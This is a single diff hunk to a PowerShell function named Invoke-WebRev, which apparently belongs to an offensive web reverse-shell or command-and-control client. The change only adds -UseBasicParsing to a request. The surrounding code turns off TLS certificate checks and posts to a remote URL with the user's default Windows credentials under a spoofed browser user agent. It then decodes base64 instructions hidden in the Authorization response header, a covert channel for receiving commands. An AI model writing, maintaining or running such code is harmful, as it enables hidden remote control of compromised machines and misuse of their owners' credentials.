@@ -39,7 +39,7 @@ function Invoke-WebRev{
         try
         {
             [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-            $req = Invoke-WebRequest $url -Method POST -Body $postParams -UseDefaultCredentials -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
+            $req = Invoke-WebRequest $url -Method POST -Body $postParams -UseBasicParsing -UseDefaultCredentials -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
             $header = $req.Headers["Authorization"];
             $c = [System.Convert]::FromBase64String($header);
             $cstr = [System.Text.Encoding]::UTF8.GetString($c);
